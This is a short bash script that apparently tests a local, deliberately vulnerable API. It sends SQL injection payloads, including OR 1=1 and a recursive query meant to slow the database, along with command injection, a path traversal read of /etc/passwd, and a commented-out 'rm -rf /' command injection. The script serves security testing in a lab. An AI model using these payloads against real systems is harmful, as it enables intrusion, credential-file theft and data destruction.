#!/bin/bash

# Test Health endpoint
echo "[+]] Testing Health endpoint:"
curl -s "http://localhost:5000/api/vulnerable/health"

# Test SQL Injection endpoint
echo -e "\n[+] Testing SQL Injection endpoint:"
# sql_query="query=SELECT+*+FROM+users+WHERE+username+=+'admin'+OR+1=1--"
# sql_query="query=SELECT+*+FROM+users+WHERE+username+=+'admin'+OR+1=1;SLEEP(5)--"
sql_query="query=SELECT+*+FROM+users+WHERE+username+=+'admin'+OR+1=1;WITH+RECURSIVE+slow_query(n)+AS+(VALUES(1)+UNION+ALL+SELECT+n+1+FROM+slow_query+LIMIT+1000000)+SELECT+n+FROM+slow_query--"
curl -s "http://localhost:5000/api/vulnerable/sqlinjection?$sql_query"

# Test Command Injection endpoint
echo -e "\n[+] Testing Command Injection endpoint:"
command="cmd=ls"
curl -s "http://localhost:5000/api/vulnerable/commandinjection?$command"

# Test Path Traversal endpoint
echo -e "\n[+] Testing Path Traversal endpoint:"
filepath="filepath=/etc/passwd"
curl -s "http://localhost:5000/api/vulnerable/pathtraversal?$filepath"

# Dangerous Command Injection test (Warning: Do not run on production)
# echo -e "\nDangerous Command Injection Test:"
# dangerous_command="cmd=rm+-rf+/"
# curl -s "http://localhost:5000/api/vulnerable/commandinjection?$dangerous_command"
